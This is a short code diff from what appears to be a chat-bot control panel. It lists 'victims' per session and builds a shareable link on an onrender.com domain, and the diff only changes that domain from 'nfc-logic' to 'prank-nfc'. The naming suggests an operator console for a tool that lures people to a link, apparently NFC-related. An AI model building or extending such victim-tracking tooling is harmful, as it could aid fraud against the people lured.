@@ -157,7 +157,7 @@ function sendControlPanel(chatId, sessionId) {
     const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
     
     // Ссылка (замени на свой домен)
-    const link = `https://nfc-logic.onrender.com/${s.shortCode}`; 
+    const link = `https://prank-nfc.onrender.com/${s.shortCode}`; 
 
     let msg = `🆔 **ID Сессии:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
 
